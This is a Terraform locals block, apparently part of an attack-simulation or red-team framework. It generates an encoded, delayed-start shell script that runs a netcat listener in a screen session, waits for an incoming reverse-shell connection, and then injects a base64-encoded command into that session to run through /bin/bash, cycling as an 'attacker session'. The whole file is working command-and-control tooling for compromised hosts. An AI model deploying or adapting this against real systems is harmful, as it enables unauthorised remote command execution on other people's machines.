locals {
    listen_port = var.inputs["listen_port"]
    listen_ip = var.inputs["listen_ip"]
    base64_command_payload = base64encode(var.inputs["payload"])
    payload = <<-EOT
    log "listener: ${local.listen_ip}:${local.listen_port}"
    while true; do
        screen -S netcat -X quit
        truncate -s 0 /tmp/netcat.log
        screen -d -L -Logfile /tmp/netcat.log -S netcat -m nc -vv -nl ${local.listen_ip} ${local.listen_port}
        screen -S netcat -X colon "logfile flush 0^M"
        log "listener started.."
        until tail /tmp/netcat.log | grep -m 1 "Connection received"; do
            log "waiting for connection...";
            sleep 10;
        done
        sleep 30
        log 'sending screen command: ${var.inputs["payload"]}';
        screen -S netcat -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
        sleep 300
        log "restarting attacker session..."
    done
    log "done"
    EOT
    
    base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }}))

    outputs = {
        base64_payload = local.base64_payload
    }
}